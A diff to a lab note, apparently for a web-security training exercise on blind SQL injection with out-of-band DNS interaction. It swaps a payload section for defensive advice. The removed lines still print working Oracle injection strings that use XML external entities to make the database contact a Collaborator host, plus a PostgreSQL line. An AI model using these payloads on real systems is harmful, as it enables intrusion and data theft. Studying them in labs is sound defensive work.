@@ -6,32 +6,10 @@
 
 **Goal:** Trigger an out-of-band DNS/HTTP interaction (Burp Collaborator required).
 
-## Technique
+## Official solution summary
 
-Use database functions that cause external network interactions (DNS lookup, HTTP request).
+The official solution demonstrates that the vulnerable database query can cause an external DNS interaction. The lab is completed by observing the expected interaction in Burp Collaborator's public service, as required by the Academy environment.
 
-## Common Payloads
+## Defensive takeaways
 
-**Oracle:**
-
-```
-' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l')='a
-```
-
-**PostgreSQL:**
-
-```
-'; SELECT pg_sleep(0); SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE 1/(SELECT 0) END; -- or use copy or other
-```
-
-More reliably, use:
-
-**Oracle (recommended for this lab):**
-
-```
-' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--
-```
-
-Or simpler XXE-style for OOB.
-
-Check the lab solution for the exact Collaborator payload required.
+Use parameterized queries and restrict database network egress to explicitly required destinations. Disable unnecessary database features that permit external lookups, and monitor DNS and outbound requests from database hosts.
